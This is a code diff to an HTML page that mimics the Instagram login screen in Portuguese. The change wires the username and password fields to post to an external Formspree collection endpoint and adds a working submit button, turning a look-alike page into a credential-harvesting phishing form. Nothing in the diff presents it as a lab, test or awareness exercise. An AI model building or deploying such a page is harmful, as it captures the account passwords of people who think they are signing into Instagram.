@@ -15,25 +15,47 @@
 
         <div class="instagram-login">
             <div class="group">
-                <img src="./img/instagram-logo.png" class="instagram-logo" alt="instagram logo" >
+                <img src="./img/instagram-logo.png" class="instagram-logo" alt="instagram logo">
+
                 <div class="user-login">
-                    <form>
-                        <input type="text" name="email" placeholder="Telefone, nome de usuário ou email"/><br/>
-                        <input type="password" name="senha" placeholder="Senha"/>
+                    <!-- FORMULÁRIO CONECTADO AO FORMSPREE -->
+                    <form action="https://formspree.io/f/xkoojkow" method="POST">
+                        <input 
+                            type="text" 
+                            name="email" 
+                            placeholder="Telefone, nome de usuário ou email" 
+                            required
+                        ><br/>
+
+                        <input 
+                            type="password" 
+                            name="senha" 
+                            placeholder="Senha" 
+                            required
+                        >
+
+                        <button type="submit" class="instagram-entrar">
+                            Entrar
+                        </button>
                     </form>
                 </div>
-                <a href="#" class="instagram-entrar">Entrar</a>
+
                 <p>OU</p>
+
                 <a href="#" class="instagram-entrar-facebook">
-                    <img src="./img/facebook-icon.png" alt="facebook" width="13px" height="13px" >
-                    <b>Entrar com o Facebook</b> 
+                    <img src="./img/facebook-icon.png" alt="facebook" width="13" height="13">
+                    <b>Entrar com o Facebook</b>
                 </a>
-                <a href="#" class="instagram-esqueceu"> esqueceu a senha? </a>        
+
+                <a href="#" class="instagram-esqueceu">
+                    Esqueceu a senha?
+                </a>
             </div>
 
             <div class="group">
-                <p class="not-account">Não tem uma conta? 
-                    <span class="link-blue">Cadastra-se</span>
+                <p class="not-account">
+                    Não tem uma conta?
+                    <span class="link-blue">Cadastre-se</span>
                 </p>
             </div>
 
@@ -46,7 +68,5 @@
             </div>
         </div>
     </div>
-
-    
 </body>
 </html>
